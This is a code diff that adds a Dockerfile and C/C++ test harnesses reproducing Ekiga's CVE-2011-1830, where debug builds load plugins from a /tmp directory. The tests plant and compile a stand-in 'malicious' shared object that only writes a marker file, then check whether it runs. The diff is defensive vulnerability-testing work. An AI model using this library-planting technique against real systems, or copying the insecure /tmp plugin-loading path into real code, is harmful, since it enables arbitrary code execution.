diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..9595490
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,21 @@
+FROM ubuntu:18.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build dependencies
+RUN apt-get -y update && \
+    apt-get install -y build-essential curl unzip wget \
+    libglib2.0-dev && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Compile the vulnerability test with DEBUG defined
+RUN gcc -o test_vulnerability test/test_vulnerability.c -DDEBUG `pkg-config --cflags --libs glib-2.0 gmodule-2.0`
+
+# Command to run the test
+CMD ["/project/test_vulnerability"]
diff --git a/lib/engine/plugin/plugin-core.cpp b/lib/engine/plugin/plugin-core.cpp
index b8f48fd..9e7a7e0 100644
--- a/lib/engine/plugin/plugin-core.cpp
+++ b/lib/engine/plugin/plugin-core.cpp
@@ -38,6 +38,7 @@
 #include "plugin-core.h"
 
 #include <gmodule.h>
+#include <stdio.h>
 
 #define DEBUG 0
 
@@ -155,6 +156,7 @@ plugin_parse_directory (Ekiga::KickStart& kickstart,
 void
 plugin_init (Ekiga::KickStart& kickstart)
 {
+  printf("[INSTRUMENTATION] plugin_init");
 #ifdef DEBUG
   // should make it easier to test ekiga without installing
   gchar* path = g_build_path (G_DIR_SEPARATOR_S,
diff --git a/test/malicious.cpp b/test/malicious.cpp
new file mode 100644
index 0000000..b2d08df
--- /dev/null
+++ b/test/malicious.cpp
@@ -0,0 +1,20 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+// Forward declaration of KickStart class
+namespace Ekiga {
+  class KickStart;
+}
+
+// This function will be called when the shared object is loaded
+extern "C" void
+ekiga_plugin_init(Ekiga::KickStart& /*kickstart*/)
+{
+  // Create a file to indicate the vulnerability was triggered
+  FILE* f = fopen("/tmp/ekiga_vulnerability_triggered", "w");
+  if (f) {
+    fprintf(f, "Vulnerability triggered!\n");
+    fclose(f);
+  }
+}
diff --git a/test/test_main.cpp b/test/test_main.cpp
new file mode 100644
index 0000000..fafaa2f
--- /dev/null
+++ b/test/test_main.cpp
@@ -0,0 +1,54 @@
+#include <iostream>
+#include <cstdlib>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <glib.h>
+
+// Include the necessary Ekiga headers
+#include "../lib/engine/framework/kickstart.h"
+#include "../lib/engine/plugin/plugin-core.h"
+
+// Define DEBUG to trigger the vulnerability
+#ifndef DEBUG
+#define DEBUG 1
+#endif
+
+int main(int argc, char* argv[])
+{
+    // Create the directory that will be checked by Ekiga when DEBUG is defined
+    const char* tmp_dir = "/tmp/ekiga_debug_plugins";
+    mkdir(tmp_dir, 0755);
+    
+    // Create a malicious shared object
+    FILE* f = fopen("/tmp/ekiga_debug_plugins/malicious.c", "w");
+    if (f) {
+        fprintf(f, "#include <stdio.h>\n");
+        fprintf(f, "extern \"C\" void ekiga_plugin_init(void* kickstart) {\n");
+        fprintf(f, "  FILE* f = fopen(\"/tmp/ekiga_vulnerability_triggered\", \"w\");\n");
+        fprintf(f, "  if (f) {\n");
+        fprintf(f, "    fprintf(f, \"Vulnerability triggered!\\n\");\n");
+        fprintf(f, "    fclose(f);\n");
+        fprintf(f, "  }\n");
+        fprintf(f, "}\n");
+        fclose(f);
+    }
+    
+    // Compile the malicious shared object
+    system("cd /tmp/ekiga_debug_plugins && gcc -shared -fPIC -o malicious.so malicious.c");
+    
+    // Remove any previous indicator file
+    unlink("/tmp/ekiga_vulnerability_triggered");
+    
+    // Initialize Ekiga's plugin system
+    Ekiga::KickStart kickstart;
+    plugin_init(kickstart);
+    
+    // Check if the vulnerability was triggered
+    if (access("/tmp/ekiga_vulnerability_triggered", F_OK) != -1) {
+        std::cout << "VULNERABILITY DETECTED: Ekiga loaded and executed malicious code from /tmp/ekiga_debug_plugins" << std::endl;
+        return 1; // Test fails if vulnerability exists
+    } else {
+        std::cout << "No vulnerability detected" << std::endl;
+        return 0; // Test passes if vulnerability does not exist
+    }
+}
diff --git a/test/test_vulnerability.c b/test/test_vulnerability.c
new file mode 100644
index 0000000..bca5c57
--- /dev/null
+++ b/test/test_vulnerability.c
@@ -0,0 +1,115 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <string.h>
+#include <glib.h>
+#include <gmodule.h>
+
+// Function to check if a file exists
+int file_exists(const char* filename) {
+  struct stat buffer;
+  return (stat(filename, &buffer) == 0);
+}
+
+// This is a simplified version of the vulnerable code from Ekiga
+void plugin_parse_file(void* kickstart, const char* filename) {
+  printf("Loading plugin: %s\n", filename);
+  GModule* plugin = g_module_open(filename, G_MODULE_BIND_LOCAL);
+  if (plugin) {
+    printf("Successfully loaded plugin: %s\n", filename);
+    
+    // Look for the ekiga_plugin_init function
+    gpointer init_func = NULL;
+    if (g_module_symbol(plugin, "ekiga_plugin_init", &init_func)) {
+      printf("Found ekiga_plugin_init function, calling it...\n");
+      // Make the plugin resident (don't unload it)
+      g_module_make_resident(plugin);
+      // Call the init function
+      ((void (*)(void*))init_func)(kickstart);
+    } else {
+      printf("Could not find ekiga_plugin_init function: %s\n", g_module_error());
+      g_module_close(plugin);
+    }
+  } else {
+    printf("Failed to load plugin: %s - %s\n", filename, g_module_error());
+  }
+}
+
+void plugin_parse_directory(void* kickstart, const char* path) {
+  GDir* directory = g_dir_open(path, 0, NULL);
+  if (directory) {
+    printf("Scanning directory: %s\n", path);
+    const gchar* name = g_dir_read_name(directory);
+    while (name) {
+      gchar* filename = g_build_filename(path, name, NULL);
+      if (g_str_has_suffix(filename, G_MODULE_SUFFIX)) {
+        plugin_parse_file(kickstart, filename);
+      }
+      g_free(filename);
+      name = g_dir_read_name(directory);
+    }
+    g_dir_close(directory);
+  } else {
+    printf("Failed to open directory: %s\n", path);
+  }
+}
+
+// This is a simplified version of the vulnerable function from Ekiga
+void plugin_init(void* kickstart) {
+#ifdef DEBUG
+  // This is the vulnerable code - it loads plugins from /tmp
+  gchar* path = g_build_path(G_DIR_SEPARATOR_S, g_get_tmp_dir(), "ekiga_debug_plugins", NULL);
+  printf("DEBUG is defined, looking for plugins in: %s\n", path);
+  plugin_parse_directory(kickstart, path);
+  g_free(path);
+#else
+  printf("DEBUG is not defined, not looking for plugins in /tmp\n");
+#endif
+}
+
+int main() {
+  printf("Testing for Ekiga CVE-2011-1830 vulnerability...\n");
+  
+  // Step 1: Create the directory that would be checked by Ekiga when DEBUG is defined
+  const char* tmp_dir = "/tmp/ekiga_debug_plugins";
+  mkdir(tmp_dir, 0755);
+  
+  // Step 2: Create a malicious shared object that will create a file when loaded
+  const char* indicator_file = "/tmp/ekiga_vulnerability_triggered";
+  unlink(indicator_file); // Remove any previous indicator file
+  
+  FILE* f = fopen("/tmp/ekiga_debug_plugins/malicious.c", "w");
+  if (f) {
+    fprintf(f, "#include <stdio.h>\n");
+    fprintf(f, "void ekiga_plugin_init(void* kickstart) {\n");
+    fprintf(f, "  printf(\"Malicious plugin executed!\\n\");\n");
+    fprintf(f, "  FILE* f = fopen(\"%s\", \"w\");\n", indicator_file);
+    fprintf(f, "  if (f) {\n");
+    fprintf(f, "    fprintf(f, \"Vulnerability triggered!\\n\");\n");
+    fprintf(f, "    fclose(f);\n");
+    fprintf(f, "  } else {\n");
+    fprintf(f, "    printf(\"Failed to create indicator file!\\n\");\n");
+    fprintf(f, "  }\n");
+    fprintf(f, "}\n");
+    fclose(f);
+  }
+  
+  // Step 3: Compile the malicious shared object
+  system("cd /tmp/ekiga_debug_plugins && gcc -shared -fPIC -o malicious.so malicious.c");
+  
+  // Step 4: Run the vulnerable code
+  printf("Running the vulnerable code...\n");
+  plugin_init(NULL);
+  
+  // Step 5: Check if the vulnerability was triggered
+  if (file_exists(indicator_file)) {
+    printf("VULNERABILITY DETECTED: The malicious plugin was loaded and executed!\n");
+    printf("This is a Code Injection vulnerability (CWE-94) that allows attackers to execute arbitrary code.\n");
+    return 1; // Test fails if vulnerability exists
+  } else {
+    printf("No vulnerability detected: The malicious plugin was not loaded or executed.\n");
+    return 0; // Test passes if vulnerability does not exist
+  }
+}
diff --git a/test/test_vulnerability.cpp b/test/test_vulnerability.cpp
new file mode 100644
index 0000000..c3c8ffd
--- /dev/null
+++ b/test/test_vulnerability.cpp
@@ -0,0 +1,50 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <string.h>
+
+// Forward declaration of classes used in Ekiga
+namespace Ekiga {
+  class KickStart;
+}
+
+// Function to check if a file exists
+int file_exists(const char* filename) {
+  struct stat buffer;
+  return (stat(filename, &buffer) == 0);
+}
+
+int main() {
+  // Create the directory that will be checked by Ekiga when DEBUG is defined
+  const char* tmp_dir = "/tmp/ekiga_debug_plugins";
+  mkdir(tmp_dir, 0755);
+  
+  // Remove any previous indicator file
+  unlink("/tmp/ekiga_vulnerability_triggered");
+  
+  // Compile our malicious shared object
+  char compile_cmd[512];
+  snprintf(compile_cmd, sizeof(compile_cmd), 
+           "g++ -shared -fPIC -o %s/malicious.so /project/test/malicious.cpp", 
+           tmp_dir);
+  
+  int ret = system(compile_cmd);
+  if (ret != 0) {
+    printf("Failed to compile malicious.so\n");
+    return 1;
+  }
+  
+  // Run Ekiga with DEBUG defined
+  // This should be done by the main program that includes this test
+  
+  // Check if the vulnerability was triggered
+  if (file_exists("/tmp/ekiga_vulnerability_triggered")) {
+    printf("VULNERABILITY DETECTED: Ekiga loaded a module from /tmp/ekiga_debug_plugins\n");
+    return 1; // Test fails if vulnerability exists
+  } else {
+    printf("No vulnerability detected\n");
+    return 0; // Test passes if vulnerability does not exist
+  }
+}
